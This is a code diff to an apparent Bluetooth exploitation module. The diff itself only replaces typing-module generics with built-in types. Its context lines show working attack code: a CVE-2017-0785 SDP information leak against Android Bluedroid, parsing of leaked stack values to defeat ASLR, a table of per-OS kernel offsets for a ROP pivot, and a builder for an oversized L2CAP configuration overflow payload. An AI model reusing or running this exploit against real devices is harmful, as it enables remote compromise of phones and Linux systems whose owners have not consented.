@@ -15,7 +15,6 @@ Requires: Linux with BlueZ, pybluez, scapy[bluetooth].
 Version: 1.1.0
 """
 
-from __future__ import annotations
 
 import binascii
 import logging
@@ -31,7 +30,7 @@ from wirelessxpl.core.os_guard import OSRequirement, requires_os
 
 logger = logging.getLogger(__name__)
 
-L2CAP_KNOWN_OFFSETS: Dict[str, Dict[str, int]] = {
+L2CAP_KNOWN_OFFSETS: dict[str, dict[str, int]] = {
     "ubuntu_16_04": {"kbase_hint": 0xFFFFFFFF81000000, "pivot": 0x00103A10, "copy_to_user": 0x000B4A20},
     "ubuntu_18_04": {"kbase_hint": 0xFFFFFFFF81000000, "pivot": 0x00118CC0, "copy_to_user": 0x000C1530},
     "android_7_bluez": {"kbase_hint": 0xFFFFFFC000080000, "pivot": 0x0008F2D0, "copy_to_user": 0x00055E60},
@@ -96,7 +95,7 @@ def _sdp_pack_search_request(uuid: int, max_records: int = 0xFFFF,
     return header + payload
 
 
-def _sdp_unpack_search_response(data: bytes) -> Dict[str, Any]:
+def _sdp_unpack_search_response(data: bytes) -> dict[str, Any]:
     """Unpack an SDP ServiceSearchResponse PDU."""
     if len(data) < 5:
         return {"records": (), "cstate": b"\x00"}
@@ -168,7 +167,7 @@ class Exploit(Exploit):
         sock.connect((self.target_address, psm))
         return sock
 
-    def _sdp_info_leak(self) -> List[Tuple[int, ...]]:
+    def _sdp_info_leak(self) -> list[tuple[int, ...]]:
         """Execute CVE-2017-0785 SDP information leak.
 
         Exploits integer underflow in Android Bluedroid SDP handler by
@@ -188,7 +187,7 @@ class Exploit(Exploit):
                 return []
 
             print_status(f"Got continuation state, starting {self.leak_rounds} leak rounds...")
-            leaked_data: List[Tuple[int, ...]] = []
+            leaked_data: list[tuple[int, ...]] = []
 
             for i in range(self.leak_rounds):
                 cstate = response["cstate"]
@@ -202,13 +201,13 @@ class Exploit(Exploit):
         finally:
             sock.close()
 
-    def _analyze_leak(self, leaked: List[Tuple[int, ...]]) -> Dict[str, int]:
+    def _analyze_leak(self, leaked: list[tuple[int, ...]]) -> dict[str, int]:
         """Analyze leaked stack data for ASLR base addresses.
 
         The SDP info leak returns uint32 values from the Bluedroid stack.
         Specific offsets contain pointers into libc.so and bluetooth.default.so.
         """
-        results: Dict[str, int] = {}
+        results: dict[str, int] = {}
         if len(leaked) >= 4 and len(leaked[-3]) >= 2:
             ptr = leaked[-3][-2]
             if ptr > 0x70000000:
@@ -291,7 +290,7 @@ class Exploit(Exploit):
         finally:
             sock.close()
 
-    def _l2cap_build_overflow_payload(self, profile: Dict[str, int]) -> bytes:
+    def _l2cap_build_overflow_payload(self, profile: dict[str, int]) -> bytes:
         """Build oversized L2CAP EFS-style configuration payload."""
         header = b"\x04\x00"  # ConfigReq code / identifier placeholder
         mtu_opt = b"\x01\x02" + struct.pack("<H", 0xFFFF)
